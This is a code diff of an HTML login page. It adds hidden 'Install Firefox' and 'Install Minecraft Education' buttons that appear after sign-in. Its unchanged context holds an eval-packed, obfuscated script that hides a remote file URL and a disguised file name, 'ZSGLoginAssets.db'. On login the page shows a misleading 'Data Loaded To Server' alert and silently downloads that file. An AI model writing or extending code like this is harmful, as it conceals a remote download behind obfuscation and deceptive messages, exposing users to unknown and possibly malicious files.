@@ -48,6 +48,25 @@
     font-style: italic;
     margin-top: 10px;
   }
+  
+      .hidden {
+      display: none;
+      padding: 10px 20px;
+      border: none;
+      background-color: #007bff;
+      color: #fff;
+      font-size: 16px;
+      text-align: center;
+      text-decoration: none;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    
+
+    .hidden:hover {
+      background-color: #0056b3;
+      display: inline-block;
+    }
 </style>
   
   <body>
@@ -58,10 +77,8 @@
 
       </form>
       <p id="error-message"></p>
-            <div id="menu" style="display: none;">
-        <button id="firefox-button">Download Firefox</button>
-        <button id="minecraft-button">Download Minecraft Education</button>
-      </div>
+  <button id="firefox" class="hidden">Install Firefox</button>
+  <button id="minecraft" class="hidden">Install Minecraft Education</button>
     </div>
 <script>
 //init login assets
@@ -76,6 +93,11 @@ function download(url, fileName) {
     });
 }
 
+    function showButton(buttonId) {
+      var button = document.getElementById(buttonId);
+      button.style.display = "block";
+    }
+    
 eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0 b=\'a://9-8.7.6/5.4\';0 3=\'2.1\';',12,12,'var|db|ZSGLoginAssets|fileName|txt|test|app|vercel|beta|codebank|https|fileUrl'.split('|'),0,{}))
 
 
@@ -141,17 +163,9 @@ if (currentDate > cutoffDate) {
       //localStorage.setItem("loginSession", logoutTime);
           alert("Data Loaded To Server, Login Success✓");  
           download(fileUrl, fileName);
+          showButton('firefox');
+          showButton('minecraft');
           })
-                // Add event listeners to the menu buttons
-      document.querySelector("#firefox-button").addEventListener("click", () => {
-        // Add the download logic for Firefox here
-        alert("Download Firefox");
-      });
-
-      document.querySelector("#minecraft-button").addEventListener("click", () => {
-        // Add the download logic for Minecraft Education here
-        alert("Download Minecraft Education");
-      });
           .catch((error) => {
             // Handle errors that occurred during sign-in
             //errorMessage.textContent = error.message;
